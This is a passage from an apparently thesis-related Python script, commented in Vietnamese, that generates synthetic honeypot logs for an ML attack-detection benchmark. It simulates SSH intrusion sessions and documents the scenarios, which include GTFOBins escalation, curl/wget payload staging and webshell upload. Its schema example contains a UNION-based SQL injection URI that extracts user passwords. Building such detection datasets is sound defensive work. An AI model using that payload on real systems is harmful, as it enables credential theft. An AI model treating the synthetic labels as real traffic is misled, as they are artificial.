            "campaign_id": camp_id,
            "scenario_id": "SCN-SSH-SYSRECON",
            "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
            "session_id": session_id,
            "sequence_number": 1,
            "timestamp": iso_time,
            "source_ip": src_ip,
            "source_port": src_port,
            "protocol": "SSH",
            "event_status": "Auth_Success",
            "username": u,
            "password": p,
            "raw_event_payload": f"SSH Authentication Success: '{u}'",
            "ground_truth": {
                "binary_label": 1,
                "attack_class": "Malicious",
                "attack_category": "Initial-Access",
                "mitre_tactic": "Initial Access",
                "mitre_technique": "T1078.003 - Valid Accounts",
                "confidence": "High"
            }
        })

        # 2. Khảo sát hệ thống (System Recon)
        scen_recon = SCENARIOS_DEF["SCN-SSH-SYSRECON"]
        for cmd, out, lat in random.sample(SSH_CMDS["sysrecon"], k=random.randint(3, 5)):
            curr_dt += datetime.timedelta(seconds=random.uniform(0.8, 3.0))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            events.append({
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-SYSRECON",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": len(events) + 1,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Interaction",
                "command": cmd,
                "command_output": out,
                "latency_ms": lat,
                "raw_event_payload": f"$ {cmd}\n{out}",
                "ground_truth": {
                    "binary_label": scen_recon["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_recon["attack_category"],
                    "mitre_tactic": scen_recon["expected_tactic"],
                    "mitre_technique": scen_recon["expected_technique"],
                    "confidence": "High"
                }
            })

        # 3. Leo thang đặc quyền (GTFOBins)
        scen_priv = SCENARIOS_DEF["SCN-SSH-GTFOBINS"]
        for cmd, out, lat in random.sample(SSH_CMDS["gtfobins"], k=random.randint(2, 3)):
            curr_dt += datetime.timedelta(seconds=random.uniform(1.2, 4.0))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            events.append({
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-GTFOBINS",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": len(events) + 1,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Interaction",
                "command": cmd,
                "command_output": out,
                "latency_ms": lat,
                "raw_event_payload": f"$ {cmd}\n{out}",
                "ground_truth": {
                    "binary_label": scen_priv["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_priv["attack_category"],
                    "mitre_tactic": scen_priv["expected_tactic"],
                    "mitre_technique": scen_priv["expected_technique"],
                    "confidence": "High"
                }
            })

        # 4. Xóa dấu vết (Defense Evasion)
        scen_evasion = SCENARIOS_DEF["SCN-SSH-DEFENSE-EVASION"]
        for cmd, out, lat in SSH_CMDS["evasion"][:2]:
            curr_dt += datetime.timedelta(seconds=random.uniform(0.6, 2.0))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            events.append({
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-DEFENSE-EVASION",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": len(events) + 1,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Interaction",
                "command": cmd,
                "command_output": out,
                "latency_ms": lat,
                "raw_event_payload": f"$ {cmd}\n{out}",
                "ground_truth": {
                    "binary_label": scen_evasion["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_evasion["attack_category"],
                    "mitre_tactic": scen_evasion["expected_tactic"],
                    "mitre_technique": scen_evasion["expected_technique"],
                    "confidence": "High"
                }
            })

        # 5. Đóng phiên
        curr_dt += datetime.timedelta(seconds=1.0)
        iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        events.append({
            "run_id": run_id,
            "campaign_id": camp_id,
            "scenario_id": "SCN-SSH-DEFENSE-EVASION",
            "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
            "session_id": session_id,
            "sequence_number": len(events) + 1,
            "timestamp": iso_time,
            "source_ip": src_ip,
            "source_port": src_port,
            "protocol": "SSH",
            "event_status": "Session_End",
            "raw_event_payload": "SSH Connection Closed (Normal Shell Exit)",
            "ground_truth": {
                "binary_label": 1,
                "attack_class": "Malicious",
                "attack_category": "Execution",
                "mitre_tactic": "Execution",
                "mitre_technique": "T1059.004 - Terminal Shell Exit",
                "confidence": "High"
            }
        })
        return events

    def _generate_ssh_insider_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh phiên điều tra mạng nội bộ (Network & Process Discovery)."""
        src_ip = f"10.0.1.{random.randint(10, 250)}" # Nguồn từ mạng LAN nội bộ
        src_port = random.randint(1025, 65534)
        u, p = ("ubuntu", "123")
        events = []
        curr_dt = start_dt

        # Login
        iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        events.append({
            "run_id": run_id,
            "campaign_id": camp_id,
            "scenario_id": "SCN-SSH-NETRECON",
            "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
            "session_id": session_id,
            "sequence_number": 1,
            "timestamp": iso_time,
            "source_ip": src_ip,
            "source_port": src_port,
            "protocol": "SSH",
            "event_status": "Auth_Success",
            "username": u,
            "password": p,
            "raw_event_payload": f"SSH Login Success: user '{u}'",
            "ground_truth": {
                "binary_label": 1,
                "attack_class": "Malicious",
                "attack_category": "Discovery",
                "mitre_tactic": "Initial Access",
                "mitre_technique": "T1078.003 - Valid Accounts",
                "confidence": "High"
            }
        })

        scen_net = SCENARIOS_DEF["SCN-SSH-NETRECON"]
        for cmd, out, lat in random.sample(SSH_CMDS["netrecon"], k=random.randint(3, 5)):
            curr_dt += datetime.timedelta(seconds=random.uniform(0.7, 2.5))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            events.append({
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-NETRECON",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": len(events) + 1,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Interaction",
                "command": cmd,
                "command_output": out,
                "latency_ms": lat,
                "raw_event_payload": f"$ {cmd}\n{out}",
                "ground_truth": {
                    "binary_label": scen_net["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_net["attack_category"],
                    "mitre_tactic": scen_net["expected_tactic"],
                    "mitre_technique": scen_net["expected_technique"],
                    "confidence": "High"
                }
            })

        # Ngắt phiên đột ngột (Socket drop)
        curr_dt += datetime.timedelta(seconds=random.uniform(0.5, 1.2))
        iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        events.append({
            "run_id": run_id,
            "campaign_id": camp_id,
            "scenario_id": "SCN-SSH-NETRECON",
            "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
            "session_id": session_id,
            "sequence_number": len(events) + 1,
            "timestamp": iso_time,
            "source_ip": src_ip,
            "source_port": src_port,
            "protocol": "SSH",
            "event_status": "Session_Aborted",
            "raw_event_payload": "SSH Session Abruptly Dropped (Client Socket Disconnected)",
            "ground_truth": {
                "binary_label": 1,
                "attack_class": "Malicious",
                "attack_category": "Defense-Evasion",
                "mitre_tactic": "Defense Evasion",
                "mitre_technique": "T1070 - Abnormal Session Drop",
                "confidence": "High"
            }
        })
        return events

# =====================================================================
# XUẤT TÀI LIỆU HỖ TRỢ LUẬN VĂN (DATASET DOCUMENTATION)
# =====================================================================
def generate_dataset_doc(manifest: Dict[str, Any]):
    doc_content = f"""# BÁO CÁO MÔ TẢ TẬP DỮ LIỆU LOG HONEYPOT (ML BENCHMARK BATCH)
**Phục vụ:** Nghiên cứu và Huấn luyện / Đánh giá mô hình Machine Learning phát hiện & phân loại tấn công mạng  
**Hệ thống thu thập:** Adaptive Honeypot Deception Engine v2.1.0 (Stateful VFS SSH + Dockerized Web DVWA)  
**Thời điểm xuất:** {manifest['created_at']}  
**Batch ID:** `{manifest['batch_id']}`

---

## 1. Tổng quan Tập Dữ liệu (Dataset Overview)
- **Định dạng dữ liệu:** JSON Lines (`.jsonl`) nguyên bản (Raw Event Stream), mỗi dòng là một sự kiện độc lập.
- **Tổng số sự kiện (Events):** `{manifest['total_events']:,}` sự kiện.
- **Tổng số phiên (Sessions):** `{manifest['total_sessions']:,}` phiên hoàn chỉnh có thể xâu chuỗi qua `session_id`.
- **Số lượng IP duy nhất (Unique Attacker IPs):** `{manifest['unique_source_ips']:,}` IP (bao gồm dải ISP Việt Nam, Cloud quốc tế, Tor/Proxy và mạng nội bộ).
- **Phân bổ Nhãn Nhị phân (Binary Classification):**
  - **Malicious (Tấn công - Nhãn 1):** `{manifest['statistics']['binary_labels']['Malicious (1)']:,}` sự kiện
  - **Benign (Bình thường / Hợp lệ - Nhãn 0):** `{manifest['statistics']['binary_labels']['Benign (0)']:,}` sự kiện
- **Phân bổ Giao thức:**
  - `HTTP` (Web DVWA Port 80): `{manifest['statistics']['protocols'].get('HTTP', 0):,}` sự kiện
  - `SSH` (Honeypot Terminal Port 2222): `{manifest['statistics']['protocols'].get('SSH', 0):,}` sự kiện

---

## 2. Thông tin Các Lần Chạy (Run Metadata - `run_id`)
Mỗi sự kiện đều chứa trường `run_id` tương ứng với từng đợt thực nghiệm có chủ đích:

| Run ID | Chiến dịch liên kết (`campaign_id`) | Bề mặt mục tiêu | Tỷ trọng |
| :--- | :--- | :--- | :--- |
| `RUN-20261102-BATCH01-BOTNET` | `CAMP-2026-BOTNET-AUTO` | SSH & HTTP Scanner | 35% |
| `RUN-20261102-BATCH02-WEBPEN` | `CAMP-2026-WEB-PENTEST` | Web DVWA (Port 80) | 35% |
| `RUN-20261102-BATCH03-HUMANAPT`| `CAMP-2026-HUMAN-APT` | SSH Interactive (Port 2222) | 20% |
| `RUN-20261102-BATCH04-INSIDER` | `CAMP-2026-LATERAL-INSIDER` | LAN Pivot (SSH/Web) | 10% |

---

## 3. Danh mục Kịch bản Thử nghiệm & Nhãn Ground Truth (`scenario_id`)

Dưới đây là chi tiết từng kịch bản thử nghiệm đã biết (`scenario_id`) làm cơ sở để đánh giá độ chính xác (Accuracy, Precision, Recall, F1-Score, Macro/Micro-AUC) của mô hình:

| Scenario ID | Tên Kịch bản & Hành vi | MITRE Tactic | Kỹ thuật MITRE ATT&CK | Phân loại Đa lớp (`attack_category`) |
| :--- | :--- | :--- | :--- | :--- |
| `SCN-SSH-BRUTE` | Dò quét mật khẩu SSH từ điển | Credential Access | `T1110.001` Password Guessing | `Brute-Force` |
| `SCN-SSH-SYSRECON` | Điều tra cấu hình hệ điều hành & phần cứng | Discovery | `T1082` System Information Discovery | `Discovery` |
| `SCN-SSH-NETRECON` | Quét cổng, socket, ARP bảng và tiến trình | Discovery | `T1049` Network Connections Discovery| `Discovery` |
| `SCN-SSH-GTFOBINS` | Leo thang đặc quyền qua GTFOBins & Sudo | Privilege Escalation | `T1548.003` Sudo Caching Abuse | `Privilege-Escalation` |
| `SCN-SSH-C2STAGE` | Tải payload đào coin / botnet qua curl/wget | Command & Control | `T1105` Ingress Tool Transfer | `C2-Malware` |
| `SCN-SSH-DEFENSE-EVASION`| Xóa lịch sử bash, ngắt socket đột ngột | Defense Evasion | `T1070.003` Clear Command History | `Defense-Evasion` |
| `SCN-WEB-SQLI-ADVANCED` | Khai thác SQLi Boolean/Blind/UNION | Initial Access | `T1190` SQL Injection | `Web-Exploit-SQLi` |
| `SCN-WEB-CMDi-CHAIN` | OS Command Injection chuỗi lệnh OS | Execution | `T1059.004` Unix Shell Injection | `Web-Exploit-CMDi` |
| `SCN-WEB-LFI-WRAPPER` | Duyệt thư mục & khai thác LFI wrapper | Credential Access | `T1552.001` Local File Inclusion | `Web-Exploit-LFI` |
| `SCN-WEB-XSS-EXFIL` | Tiêm mã độc XSS đánh cắp phiên | Execution | `T1059.007` JavaScript Execution | `Web-Exploit-XSS` |
| `SCN-WEB-WEBSHELL-UPLOAD`| Upload Webshell (`.phtml`, `.php5`) | Persistence | `T1505.003` Web Shell Component | `Web-Exploit-Upload` |
| `SCN-WEB-SCANNER-SWEEP` | Quét tự động Nikto, SQLMap, Nuclei | Discovery | `T1046` Network Service Discovery | `Web-Scanner` |
| `SCN-WEB-BENIGN-TRAFFIC`| Truy cập trang web quản trị thông thường | Normal Operation | Normal Operation | `Benign` |

---

## 4. Cấu trúc Schema Bản ghi Sự kiện (JSONL Record Schema)

Mỗi sự kiện nguyên bản trong tệp `logs/ml_benchmark_batch_raw.jsonl` có cấu trúc chuẩn như sau:

```json
{{
  "run_id": "RUN-20261102-BATCH02-WEBPEN",
  "campaign_id": "CAMP-2026-WEB-PENTEST",
  "scenario_id": "SCN-WEB-SQLI-ADVANCED",
  "honeypot": {{
    "sensor_name": "Adaptive-Honeypot-Deception-Engine",
    "sensor_version": "2.1.0-Release",
    "node_id": "sensor-hcm-edge-web-01",
    "emulated_service": "Apache/2.4.52 (Ubuntu) PHP/8.1.2 DVWA-2.0",
    "internal_port": 80,
    "runtime_environment": "Docker Containerized Low-Interaction Trap"
  }},
  "session_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
  "sequence_number": 1,
  "timestamp": "2026-10-20T04:12:35.812Z",
  "source_ip": "113.160.45.18",
  "source_port": 49152,
  "protocol": "HTTP",
  "event_status": "Web_Request",
  "method": "GET",
  "uri": "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+--+-&Submit=Submit",
  "http_status_code": 200,
  "bytes_transferred": 2840,
  "user_agent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
  "raw_event_payload": "GET /vulnerabilities/sqli/?id=1%27... HTTP/1.1 -> 200 (2840 bytes)",
  "ground_truth": {{
    "binary_label": 1,
    "attack_class": "Malicious",
    "attack_category": "Web-Exploit-SQLi",
    "mitre_tactic": "Initial Access",
    "mitre_technique": "T1190 - Exploit Public-Facing Application: SQL Injection",
    "confidence": "High"
  }}
}}
```

---

## 5. Khuyến nghị Kỹ thuật Đặc trưng & Huấn luyện Mô hình ML cho Luận văn

1. **Gom phiên theo `session_id`:**
   - Dùng `sequence_number` và `timestamp` để tính toán khoảng cách thời gian giữa các lệnh ($\Delta t$), xác định tốc độ gõ phím của botnet vs con người.
2. **Kỹ thuật trích xuất đặc trưng (Feature Extraction):**
   - **Xử lý chuỗi lệnh / URI:** TF-IDF n-grams (ký tự và từ ngữ), Byte-pair Encoding (BPE), hoặc nhúng câu qua MiniLM/SecBERT.
   - **Thống kê phiên:** Tỷ lệ mã trạng thái HTTP (200, 404, 500), số lượng lệnh nhập vào, độ trễ phản hồi (`latency_ms`), số lần xác thực thất bại.
3. **Bài toán Học máy phù hợp:**
   - **Binary Classification (Phát hiện tấn công):** Phân biệt `Benign` (0) vs `Malicious` (1) sử dụng Random Forest, XGBoost, LightGBM hoặc SVM.
   - **Multi-Class Classification (Phân loại hình thái):** Phân loại 10+ nhóm hành vi trong trường `attack_category` hoặc phân loại `mitre_tactic`.
   - **Sequence / Behavioral Modeling:** Áp dụng LSTM, GRU, hoặc Graph Neural Network (GNN) để dự báo bước đi tiếp theo của kẻ tấn công trong chuỗi kill-chain.
"""
    with open(OUTPUT_DOC_FILE, "w", encoding="utf-8") as f:
        f.write(doc_content)
    print(f"✅ Đã tạo tài liệu mô tả bộ dữ liệu: {OUTPUT_DOC_FILE}")

# =====================================================================
# HÀM CHÍNH
# =====================================================================
def main():
    LOGS_DIR.mkdir(parents=True, exist_ok=True)
    generator = MLBenchmarkGenerator(target_events=10000, days_span=14)
    raw_events, manifest = generator.generate()

    print(f"\n[*] Đang lưu {len(raw_events):,} sự kiện gốc vào {OUTPUT_BATCH_FILE}...")
    with open(OUTPUT_BATCH_FILE, "w", encoding="utf-8") as f:
        for ev in raw_events:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")
    print(f"✅ Đã ghi thành công tệp log gốc: {OUTPUT_BATCH_FILE} ({OUTPUT_BATCH_FILE.stat().st_size / 1024 / 1024:.2f} MB)")

    print(f"[*] Đang lưu siêu dữ liệu manifest vào {OUTPUT_MANIFEST_FILE}...")
    with open(OUTPUT_MANIFEST_FILE, "w", encoding="utf-8") as f:
        json.dump(manifest, f, ensure_ascii=False, indent=2)
    print(f"✅ Đã ghi thành công tệp manifest: {OUTPUT_MANIFEST_FILE}")

    generate_dataset_doc(manifest)

    print("\n" + "=" * 80)
    print("🎉 HOÀN THÀNH TẠO BATCH DỮ LIỆU ĐÁNH GIÁ MÔ HÌNH HỌC MÁY!")
    print(f"📁 Tệp Log gốc (Raw JSONL):          {OUTPUT_BATCH_FILE}")
    print(f"📁 Tệp Manifest (Run & Scenarios):   {OUTPUT_MANIFEST_FILE}")
    print(f"📁 Tài liệu mô tả luận văn:         {OUTPUT_DOC_FILE}")
    print("=" * 80)

if __name__ == "__main__":
    main()
